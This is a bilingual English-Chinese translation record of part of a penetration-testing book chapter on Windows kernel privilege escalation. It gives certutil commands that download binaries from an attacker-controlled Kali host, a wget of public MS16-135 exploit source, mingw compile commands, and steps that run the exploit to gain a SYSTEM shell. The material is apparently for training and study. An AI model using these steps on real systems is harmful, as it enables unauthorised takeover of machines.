  type: TYPE_NORMAL
  zh: 为了将**winPEAS.exe**二进制文件传输到目标，我们需要在Kali虚拟机上设置一个Web服务器，用来托管该二进制文件，以便我们可以在目标系统上下载它。可以按照这里概述的步骤进行操作：
- en: 'To set up a web server on our Kali VM, we can utilize the **SimpleHTTPServer**
    Python module to serve the binary file. This can be done by running the following
    command in the directory where the **winPEAS.exe** binary is stored:'
  id: totrans-120
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要在我们的Kali虚拟机上设置Web服务器，我们可以使用**SimpleHTTPServer** Python模块来提供二进制文件。可以通过在存储**winPEAS.exe**二进制文件的目录中运行以下命令来完成：
- en: '**sudo python -m SimpleHTTPServer 80**'
  id: totrans-121
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sudo python -m SimpleHTTPServer 80**'
- en: Note
  id: totrans-122
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 注意
- en: '**SimpleHTTPServer** is a Python module for both Python 2 and Python 3.'
  id: totrans-123
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**SimpleHTTPServer**是一个适用于Python 2和Python 3的Python模块。'
- en: 'As highlighted in the following screenshot, the **SimpleHTTPServer** module
    will serve the files in the directory on the Kali VM IP address on port **80**:'
  id: totrans-124
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下截图所示，**SimpleHTTPServer**模块将在Kali虚拟机的IP地址上通过端口**80**提供目录中的文件：
- en: '![Figure 5.12 – SimpleHTTPServer'
  id: totrans-125
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 5.12 – SimpleHTTPServer](Images/B17389_05_014.jpg)'
- en: '](Images/B17389_05_012.jpg)'
  id: totrans-126
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_05_012.jpg)'
- en: Figure 5.12 – SimpleHTTPServer
  id: totrans-127
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 5.12 – SimpleHTTPServer
- en: 'In order to download the **winPEAS.exe** binary onto the target system, we
    can utilize the **certutil** utility. Before we can download the binary, however,
    we need to navigate to a directory where we have read and write permissions. In
    this case, we will navigate to the current user''s desktop as illustrated in the
    following screenshot:'
  id: totrans-128
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了将**winPEAS.exe**二进制文件下载到目标系统，我们可以使用**certutil**工具。然而，在下载二进制文件之前，我们需要导航到一个有读写权限的目录。在这种情况下，我们将导航到当前用户的桌面，如下图所示：
- en: '![Figure 5.13 – Default user directory](Images/B17389_05_013.jpg)'
  id: totrans-129
  prefs: []
  type: TYPE_IMG
  zh: '![图 5.13 – 默认用户目录](Images/B17389_05_013.jpg)'
- en: Figure 5.13 – Default user directory
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 图 5.13 – 默认用户目录
- en: 'We can now use the **certutil** utility to download the binary from the Kali
    VM to our target system. This can be done by running the following command on
    the target system:'
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们可以使用**certutil**工具从Kali虚拟机下载二进制文件到目标系统。这可以通过在目标系统上运行以下命令来完成：
- en: '**certutil -urlcache -f http://<KALI-VM>/winPEASx64.exe winPEAS.exe**'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: '**certutil -urlcache -f http://<KALI-VM>/winPEASx64.exe winPEAS.exe**'
- en: 'The output for this command can be seen in the following screenshot:'
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 该命令的输出可以在以下截图中看到：
- en: '![Figure 5.14 – certutil successful transfer'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 5.14 – certutil 成功传输](Images/B17389_05_012.jpg)'
- en: '](Images/B17389_05_014.jpg)'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_05_014.jpg)'
- en: Figure 5.14 – certutil successful transfer
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 图 5.14 – certutil 成功传输
- en: As shown in the preceding screenshot, if the transfer is successful, the binary
    should be downloaded and saved with the name we specified.
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的截图所示，如果传输成功，二进制文件应该会被下载并保存为我们指定的名称。
- en: We can now use the winPEAS binary to enumerate potential kernel vulnerabilities
    that we can use to elevate our privileges.
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在可以使用winPEAS二进制文件来枚举潜在的内核漏洞，这些漏洞可以用于提升我们的权限。
- en: Enumerating kernel exploits
  id: totrans-139
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 枚举内核漏洞
- en: 'The winPEAS binary enumerates a lot of information and will perform various
    checks to discover potential vulnerabilities. In the context of kernel exploits,
    we only need to enumerate the system information. This can be done by going through
    the procedure outlined as follows:'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: winPEAS二进制文件会枚举大量信息，并执行各种检查以发现潜在的漏洞。在内核漏洞的上下文中，我们只需要枚举系统信息。这可以通过以下步骤完成：
- en: 'To enumerate all important system information, we need to run the **winPEAS.exe**
    binary with the following parameter:'
  id: totrans-141
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要枚举所有重要的系统信息，我们需要运行**winPEAS.exe**二进制文件，并使用以下参数：
- en: '**.\winPEAS.exe systeminfo**'
  id: totrans-142
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**.\winPEAS.exe systeminfo**'
- en: 'As shown in the following screenshot, the binary will enumerate system information
    and, based on the build version and the hotfixes installed, it will output a list
    of kernel exploits that can be used to elevate privileges:'
  id: totrans-143
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下截图所示，二进制文件将枚举系统信息，并根据构建版本和安装的补丁，输出可以用来提升权限的内核漏洞列表：
- en: '![Figure 5.15 – winPEAS kernel exploits'
  id: totrans-144
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 5.15 – winPEAS 内核漏洞](Images/B17389_05_015.jpg)'
- en: '](Images/B17389_05_015.jpg)'
  id: totrans-145
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_05_015.jpg)'
- en: Figure 5.15 – winPEAS kernel exploits
  id: totrans-146
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 5.15 – winPEAS 内核漏洞
- en: 'We can also utilize the **Windows-Exploit-Suggester** tool to enumerate our
    system information and scan for potential kernel exploits. This can be done by
    running the following command:'
  id: totrans-147
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们还可以使用**Windows-Exploit-Suggester**工具来枚举我们的系统信息并扫描潜在的内核漏洞。可以通过运行以下命令来完成此操作：
- en: '**./windows-exploit-suggester.py -–database <database>.xlsx -–systeminfo <systeminfo>.txt**'
  id: totrans-148
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**./windows-exploit-suggester.py -–database <database>.xlsx -–systeminfo <systeminfo>.txt**'
- en: 'The **Windows-Exploit-Suggester** script can be downloaded from this link:
    [https://github.com/AonCyberLabs/Windows-Exploit-Suggester.](https://github.com/AonCyberLabs/Windows-Exploit-Suggester%20)'
  id: totrans-149
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**Windows-Exploit-Suggester**脚本可以通过以下链接下载：[https://github.com/AonCyberLabs/Windows-Exploit-Suggester.](https://github.com/AonCyberLabs/Windows-Exploit-Suggester%20)'
- en: 'As outlined in the following screenshot, the script will enumerate all potential
    kernel exploits that can be used to elevate privileges. We can now use this information
    to determine the correct kernel exploit to use:'
  id: totrans-150
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下截图所示，脚本将列出所有可以用于提升权限的潜在内核利用程序。我们现在可以利用这些信息来确定使用哪个正确的内核利用程序：
- en: '![Figure 5.16 – Windows-Exploit-Suggester kernel exploits'
  id: totrans-151
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 5.16 – Windows-Exploit-Suggester 内核利用程序'
- en: '](Images/B17389_05_016.jpg)'
  id: totrans-152
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_05_016.jpg)'
- en: Figure 5.16 – Windows-Exploit-Suggester kernel exploits
  id: totrans-153
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 5.16 – Windows-Exploit-Suggester 内核利用程序
- en: 'It is always recommended to use the first exploits output by the enumeration
    tools and scripts. In this case, we will start off with the **MS16-135** kernel
    exploit. We will need to determine more information about the exploit and how
    it should be used. We can do this by performing a quick Google search as highlighted
    in the following screenshot:'
  id: totrans-154
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 始终建议使用枚举工具和脚本输出的第一个利用程序。在本例中，我们将从**MS16-135**内核利用程序开始。我们需要进一步了解该利用程序以及如何使用它。我们可以通过进行快速的
    Google 搜索来获取更多信息，如下截图所示：
- en: '![Figure 5.17 – MS16-135 exploit search'
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 5.17 – MS16-135 利用程序搜索'
- en: '](Images/B17389_05_017.jpg)'
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_05_017.jpg)'
- en: Figure 5.17 – MS16-135 exploit search
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 图 5.17 – MS16-135 利用程序搜索
- en: The Google search reveals a GitHub repository that contains information regarding
    the exploit, the exploit source code, and how it should be used.
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: Google 搜索显示了一个 GitHub 仓库，其中包含有关利用程序的信息、利用程序源代码以及如何使用它的说明。
- en: It is always recommended to analyze the source code to ensure that it is not
    malicious and works as intended to make any additional modifications required.
    Let's take a look at how to compile a Windows exploit from source.
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 始终建议分析源代码，以确保它没有恶意并按预期工作，做任何必要的额外修改。让我们来看看如何从源代码编译一个 Windows 利用程序。
- en: Compiling Windows exploits
  id: totrans-160
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 编译 Windows 利用程序
- en: 'The ability to modify and compile exploits is extremely important as it allows
    you to ensure the exploit works as intended and provides you with the flexibility
    to make modifications to the exploit as per your requirements. In this case, we
    will be taking a look at how to compile the exploit code into a binary manually:'
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 修改和编译利用程序的能力非常重要，因为它可以确保利用程序按预期工作，并为你提供根据需求对利用程序进行修改的灵活性。在本例中，我们将看看如何手动将利用程序代码编译成二进制文件：
- en: 'To begin with, we must ensure that our Kali Linux VM has all the necessary
    build tools required for compiling Windows binaries. This can be done by running
    the following command:'
  id: totrans-162
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，我们必须确保我们的 Kali Linux 虚拟机具备编译 Windows 二进制文件所需的所有构建工具。可以通过运行以下命令来完成：
- en: '**sudo apt install mingw-w64**'
  id: totrans-163
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sudo apt install mingw-w64**'
- en: 'You will now need to download the exploit code to the Kali VM. This can either
    be done directly or through the **wget** utility as follows:'
  id: totrans-164
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，你需要将利用程序代码下载到 Kali 虚拟机。这可以通过直接下载或使用**wget**工具实现，如下所示：
- en: '**wget https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/MS16-135/41015.c**'
  id: totrans-165
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**wget https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/MS16-135/41015.c**'
- en: We can now begin the compilation process, however, based on the target system's
    architecture, we will need to compile the source code differently.
  id: totrans-166
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们可以开始编译过程了，不过，根据目标系统的架构，我们需要以不同的方式编译源代码。
- en: 'For x64-based operating systems, run the following command, and substitute
    the parameters with your own files and output names:'
  id: totrans-167
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 对于基于 x64 的操作系统，运行以下命令，并根据自己的文件和输出名称替换参数：
- en: '**i686-w64-mingw32-gcc exploit.c -o exploit.exe**'
  id: totrans-168
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**i686-w64-mingw32-gcc exploit.c -o exploit.exe**'
- en: 'If the target is a 32-bit system, run the following command:'
  id: totrans-169
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果目标是 32 位系统，运行以下命令：
- en: '**i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32**'
  id: totrans-170
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32**'
- en: This will compile the exploit into a binary that we can then transfer over to
    our target to be executed.
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 这将编译利用程序成一个二进制文件，然后我们可以将其转移到目标系统上执行。
- en: Running the kernel exploit
  id: totrans-172
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 运行内核利用程序
- en: 'After successful compilation of the exploit code, we can transfer over the
    compiled binary to the target system and execute it based on the instructions
    provided in the documentation of the exploit. This can be done by following the
    procedures outlined as follows:'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 成功编译利用程序代码后，我们可以将编译好的二进制文件传输到目标系统，并根据利用程序文档中的说明执行。这可以通过按照以下程序进行：
- en: 'In this particular case, the execution of the kernel exploit binary is straightforward
    and only requires the specification of the target operating system version. Before
    we can execute it, we need to transfer the exploit over to the target. This can
    be done by starting a local web server on the Kali VM with the **SimpleHTTPServer**
    Python module:'
  id: totrans-174
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在这个特定的情况下，执行内核漏洞二进制文件是直接的，仅需要指定目标操作系统版本。在执行之前，我们需要将漏洞传输到目标系统。这可以通过在 Kali 虚拟机上启动一个本地
    web 服务器并使用 **SimpleHTTPServer** Python 模块来完成：
- en: '**sudo python -m SimpleHTTPServer 80**'
  id: totrans-175
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sudo python -m SimpleHTTPServer 80**'
- en: In order to download the binary onto the target system, we can utilize the **certutil**
    utility. Before we can download the binary, however, we need to navigate to a
    directory where we have read and write permissions. In this case, we will navigate
    to the current user's desktop as shown in the following screenshot:![Figure 5.18
    – Default user directory](Images/B17389_05_018.jpg)
  id: totrans-176
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了将二进制文件下载到目标系统，我们可以使用 **certutil** 工具。然而，在下载二进制文件之前，我们需要进入一个具有读写权限的目录。在这种情况下，我们将进入当前用户的桌面，如下图所示：![图5.18
    – 默认用户目录](Images/B17389_05_018.jpg)
- en: Figure 5.18 – Default user directory
  id: totrans-177
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图5.18 – 默认用户目录
- en: 'We can now use the **certutil** utility to download the binary from the Kali
    VM to our target system. This can be done by running the following command on
    the target system:'
  id: totrans-178
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们现在可以使用 **certutil** 工具从 Kali 虚拟机将二进制文件下载到目标系统。可以通过在目标系统上运行以下命令来完成：
- en: '**certutil -urlcache -f http://<KALI-VM>/exploit.exe exploit.exe**'
  id: totrans-179
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**certutil -urlcache -f http://<KALI-VM>/exploit.exe exploit.exe**'
- en: 'We can now run the exploit binary by executing it on the target as follows:'
  id: totrans-180
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们可以通过在目标系统上执行漏洞二进制文件来运行它，如下所示：
- en: '**.\exploit.exe**'
  id: totrans-181
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**.\exploit.exe**'
- en: 'The output of the preceding command is shown in the following screenshot:'
  id: totrans-182
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 前面命令的输出如下面的截图所示：
- en: '![Figure 5.19 – Exploit options](Images/B17389_05_019.jpg)'
  id: totrans-183
  prefs: []
  type: TYPE_IMG
  zh: '![图5.19 – 漏洞选项](Images/B17389_05_019.jpg)'
- en: Figure 5.19 – Exploit options
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 图5.19 – 漏洞选项
- en: 'As highlighted in *Figure 5.19*, the exploit requires the user to specify the
    target operating system. This can be done by executing the exploit with the following
    option:'
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 如*图5.19*所示，利用此漏洞需要用户指定目标操作系统。可以通过以下选项执行漏洞来完成此操作：
- en: '**.\exploit.exe 7**'
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: '**.\exploit.exe 7**'
- en: 'After running the exploit with the operating system specified, it will take
    a few seconds to complete, after which we should have an elevated shell with **nt
    authority\system** privileges:'
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: 在指定操作系统后运行漏洞时，完成需要几秒钟时间，之后我们应该获得一个具有 **nt authority\system** 权限的提升的 shell：
- en: '![Figure 5.20 – Manual kernel exploit successful'
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: '![图5.20 – 手动内核漏洞成功](Images/B17389_05_020.jpg)'
- en: '](Images/B17389_05_020.jpg)'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_05_020.jpg)'
- en: Figure 5.20 – Manual kernel exploit successful
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 图5.20 – 手动内核漏洞成功
- en: As highlighted in the preceding screenshot, the exploit ran successfully and
    elevated our privileges automatically.
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的截图所示，漏洞成功运行并自动提升了我们的权限。
- en: We are now able to successfully run Windows kernel exploits both manually and
    automatically and can begin exploring other privilege escalation vectors.
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在已经能够成功手动和自动运行 Windows 内核漏洞，并可以开始探索其他权限提升向量。
- en: Summary
  id: totrans-193
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we got started with identifying and running kernel exploits
    automatically with the Metasploit framework. We then looked at how to identify,
    compile, and transfer kernel exploits manually. We then ended the chapter with
    how to execute kernel exploits on the target system successfully in order to elevate
    our privileges on the target system.
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们首先介绍了如何使用 Metasploit 框架自动识别和运行内核漏洞。接着，我们讨论了如何手动识别、编译和传输内核漏洞。最后，我们以如何成功在目标系统上执行内核漏洞以提升我们的权限作为结束。
- en: Now that we have learned how to perform kernel exploitation on Windows, we can
    begin exploring other privilege escalation vectors.
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经学会了如何在 Windows 上进行内核漏洞利用，我们可以开始探索其他权限提升向量。
- en: In the next chapter, we will explore impersonation attacks on Windows and how
    they can lead to successful privilege escalation.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将探讨 Windows 上的冒充攻击以及它们如何导致成功的权限提升。
